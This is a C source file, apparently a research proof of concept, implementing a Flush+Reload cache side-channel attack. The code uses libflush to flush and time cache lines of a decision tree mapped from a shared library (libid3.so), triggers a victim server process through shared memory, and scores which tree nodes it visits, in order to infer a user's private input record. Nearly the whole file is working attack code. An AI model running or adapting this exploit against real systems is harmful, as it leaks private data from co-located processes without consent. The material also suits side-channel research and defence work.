/**
 *	sync one round attack
 *
 *	Copyright (C) 2017  Jinbum Park <jinb.park@samsung.com> Haehyun Cho <hcho67@asu.edu>
*/

#include "common.h"
#include <id3.h>
#include <stdbool.h>
#include <libflush.h>

/*
 * Feature nodes in prestored decision tree

	 -1 is the root node
	 0 is Sunny value for attribute Outlook
	 6 is Overcast value for attribute Outlook
	 8 is Rain value for attribute Outlook
	 2 is High value for attribute Humidity
	 11 is Normal value for attribute Humidity
	 3 is Weak value for attribute Wind
	 5 is Strong value for attribute Wind
	 4 is value for Class NO
	 7 is value for Class YES
 *
 * Goal of attacker
 *   : Induce which nodes are visited in server process.
 *   : If 0, 1 are visited, Attacker induce input record is "Sunnay" & "Normal"
 *   : This attack can expose privacy of user.
 *
 * Assumption
 *   : Attacker already knows a structure of decision tree.
 *
 * Sample data-set, code are from http://id3alg.altervista.org/
 */

int lib_fd;
void *lib_addr;
U32 lib_size;

pre_node_t *dec_tree;
struct pre_dsinfo_t *dec_tree_infolist;
unsigned int off_dec_tree;
unsigned int off_dec_tree_infolist;
unsigned int test_count;
const int cache_line_size = 64;
uint64_t threshold = 300;
libflush_session_t *session;

unsigned int score[12] = {0,};

#if 0 /* testset that server use */
char *testset1[] = 
{
	/*
	 * outlook, temperature, humidity, wind, play ball (class)
	 */
	"SUNNY", 	"MILD",  	"HIGH",    	"WEAK",		"NO",
};
#endif

/* real input record from testset1 */
/* SUNNY-->HIGH-->NO (class) */
unsigned int real_input[12] = {
	[0] = 1, [2] = 1, [3] = 1, [4] = 1, [9] = 1,
};

void map_lib(const char *path)
{
	struct stat st;

	lib_fd = open(path, O_RDONLY);
	if(lib_fd < 0) {
		printf("open error\n");
		exit(-1);
	}

	fstat(lib_fd, &st);
	lib_size = st.st_size;

	lib_addr = mmap(NULL, lib_size, PROT_READ, MAP_PRIVATE, lib_fd, 0);
	if(lib_addr == NULL) {
		printf("mmap error\n");
		exit(-1);
	}
	dec_tree = (U8 *)lib_addr + off_dec_tree;
	dec_tree_infolist = (U8 *)lib_addr + off_dec_tree_infolist;

	printf("dec_tree node size : %d\n", sizeof(pre_node_t));
	printf("first winvalue : %ld\n", dec_tree[31].winvalue);
}

void string_to_hex(U8 *pIn, unsigned int pInLen, U8 *pOut)
{
   unsigned int i, j;
   unsigned int mul;
   char data = 0;

   for(i=0, j=0; i<pInLen; i++) {
       if(i % 2 == 0)
           mul = 16;
       else
           mul = 1;

       if(pIn[i] >= '0' && pIn[i] <= '9')
           data += ((pIn[i] - 48) * mul);
       else if(pIn[i] >= 'a' && pIn[i] <= 'f')
           data += ((pIn[i] - 87) * mul);
       else if(pIn[i] >= 'A' && pIn[i] <= 'F')
           data += ((pIn[i] - 55) * mul);
       else
           return;

       if(mul == 1)
       {
           pOut[j] = data;
           data = 0;
           j++;
       }
   }
}

static void hex_string_to_int(unsigned char *pIn, unsigned int pInLen, unsigned int *pOut)
{
    /* HexString must be Big-Endian!! */
    int is_little_endian = 0;
    unsigned int test = 0x10000001;
    char *ptr = (char*)&test;

    if(ptr[0] == 0x01)
    {
        is_little_endian = 1;
    }
    if(pInLen != sizeof(unsigned int) * 2)
    {
        return;
    }
    string_to_hex((unsigned char*)pIn, pInLen, (char*)pOut);

    if(is_little_endian)
    {
        char tmp;
        unsigned int i, j;

        ptr = (char*)pOut;
        for(i=0, j=sizeof(unsigned int)-1; i<sizeof(unsigned int); i++, j--)
        {
            if(i > j)
            {
                break;
            }
            tmp = ptr[i];
            ptr[i] = ptr[j];
            ptr[j] = tmp;
        }
    }
} 

void get_args(int argc, char **argv)
{
	if(argc != 6) {
		printf("USAGE: ./attack <test count> <cache miss threshold> <offset decision tree> <offset infolist> <decision tree library path>\n");
		printf("EXAMPLE: ./attack 100 300 001636c0 001637c0 /usr/lib/libid3.so\n");
		exit(-1);
	}

	test_count = (unsigned int)atoi(argv[1]);
	threshold = (uint64_t)atoi(argv[2]);
	hex_string_to_int(argv[3], strlen(argv[3]), &off_dec_tree);
	hex_string_to_int(argv[4], strlen(argv[4]), &off_dec_tree_infolist);
	map_lib(argv[5]);
}

static inline void flush_dec_tree(U32 idx)
{	
	libflush_flush(session, dec_tree + idx);
}

static inline int reload_dec_tree_is_useful(U32 idx)
{
	uint64_t count;

	count = libflush_reload_address(session, dec_tree + idx);
	if(count < threshold)
		return 1;
	return 0;
}


struct shm_msg *client_msg;
struct shm_msg *server_msg;

void print_result_to_csv(void)
{
	FILE *fp = NULL;
	char str[128] = {0,};
	unsigned i;

	fp = fopen("./result.csv", "w");
	if (!fp) {
		printf("fopen error\n");
		return;
	}

	snprintf(str, 128, "test count,%d\n", test_count);
	fwrite(str, 1, strlen(str), fp);
	
	fwrite("cache result\n", 1, strlen("cache result\n"), fp);
	for (i=0; i<12; i++) {
		if (i == 11)
			snprintf(str, 128, "%s\n", dec_tree_infolist[i].name);
		else
			snprintf(str, 128, "%s,", dec_tree_infolist[i].name);
		fwrite(str, 1, strlen(str), fp);
	}
	for (i=0; i<12; i++) {
		if (i == 11)
			snprintf(str, 128, "0x%lx\n", (unsigned long)(dec_tree + i));
		else
			snprintf(str, 128, "0x%lx,", (unsigned long)(dec_tree + i));
		fwrite(str, 1, strlen(str), fp);
	}
	for (i=0; i<12; i++) {
		if (i == 11)
			snprintf(str, 128, "%d\n", score[i]);
		else
			snprintf(str, 128, "%d,", score[i]);
		fwrite(str, 1, strlen(str), fp);
	}

	fwrite("\nreal input record\n", 1, strlen("\nreal input record\n"), fp);
	for (i=0; i<12; i++) {
		if (i == 11)
			snprintf(str, 128, "%s\n", dec_tree_infolist[i].name);
		else
			snprintf(str, 128, "%s,", dec_tree_infolist[i].name);
		fwrite(str, 1, strlen(str), fp);
	}
	for (i=0; i<12; i++) {
		if (i == 11)
			snprintf(str, 128, "0x%lx\n", (unsigned long)(dec_tree + i));
		else
			snprintf(str, 128, "0x%lx,", (unsigned long)(dec_tree + i));
		fwrite(str, 1, strlen(str), fp);
	}
	for (i=0; i<12; i++) {
		if (i == 11)
			snprintf(str, 128, "%d\n", real_input[i]);
		else
			snprintf(str, 128, "%d,", real_input[i]);
		fwrite(str, 1, strlen(str), fp);
	}

	fclose(fp);
}


void do_test_dec_tree(void)
{
	U32 j;
	char msg[16] = "send!!";
	char reply_msg[MSG_SIZE_MAX] = {0,};

	/* prepare msg */
	client_msg->status = 0;
	client_msg->len = 16;
	
	/* send msg */
	memcpy(client_msg->msg, msg, 16);
	client_msg->status = 1;

	/* read reply */
	while(1) {
		if(server_msg->status == 1) {
			memcpy(reply_msg, server_msg->msg, server_msg->len);
			server_msg->status = 0;
			break;
		}
	}
}

void do_attack(void)
{
	unsigned int i, j, idx;
	int ret;

	for(i=0; i<test_count; i++) {
		for(j=0; j<12; j++) {
			//idx = probe_idx[j];

			/* flush */
			flush_dec_tree(j);

			/* operation */
			do_test_dec_tree();

			/* reload */
			ret = reload_dec_tree_is_useful(j);
			if(ret)
				score[j] += 1;
		}
	}
}

void bind_cpu(int cpuid)
{
    unsigned long mask = 0;

    if(cpuid == 0) mask = 1;
    else if(cpuid == 1) mask = 2;
    else if(cpuid == 2) mask = 4;
    else if(cpuid == 3) mask = 8;

    if(sched_setaffinity(0, sizeof(mask), (cpu_set_t*)&mask) < 0)
    {
        printf("sched_setaffinity error\n");
        return;
    }
}

void print_result(void)
{
	unsigned int i;

	for(i=0; i<12; i++) {
		printf("Node [%d,%s] - Score : %d\n", i, dec_tree_infolist[i].name, score[i]);
	}
	print_result_to_csv();
}

void init_libflush(void)
{
	bool r;

	r = libflush_init(&session, NULL);
	if(r == false) {
		printf("libflush_init error\n");
		exit(-1);
	}
}

void finalize_libflush(void)
{
	libflush_terminate(session);
}

int main(int argc, char **argv)
{
	char msg[MSG_SIZE_MAX];

	void *addr;
	int fd;
	ssize_t nread;

	int msg_size, repeat_count = 1;
	unsigned int i, j;

	/* init */
	get_args(argc, argv);
	init_libflush();
	bind_cpu(1);

	/* get shm */
	if((fd = shm_open(SHM_NAME, O_RDWR, PERM_FILE)) == -1) {
		printf("shm_open error : %s\n", strerror(errno));
		return -1;
	}

	/* mmap */
	addr = mmap(NULL, MSG_SIZE_MAX, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if(addr == MAP_FAILED) {
		printf("mmap error : %s\n", strerror(errno));
		goto out;
	}

	client_msg = (struct shm_msg *)((char*)addr + SHM_CLIENT_BUF_IDX);
	server_msg = (struct shm_msg *)((char*)addr + SHM_SERVER_BUF_IDX);

	/* attack!! */
	do_attack();
	print_result();

	/* send end msg */
	client_msg->status = 0;
	client_msg->len = sizeof(END_MSG);
	strncpy(client_msg->msg, END_MSG, client_msg->len);
	client_msg->status = 1;

out:
	/* close shm */
	if(munmap(addr, MSG_SIZE_MAX) == -1) {
		printf("munmap error : %s\n", strerror(errno));
	}

	if(close(fd) == -1) {
		printf("close error : %s\n", strerror(errno));
		return -1;
	}

	finalize_libflush();
	munmap(lib_addr, lib_size);
	close(lib_fd);
	return 0;
}
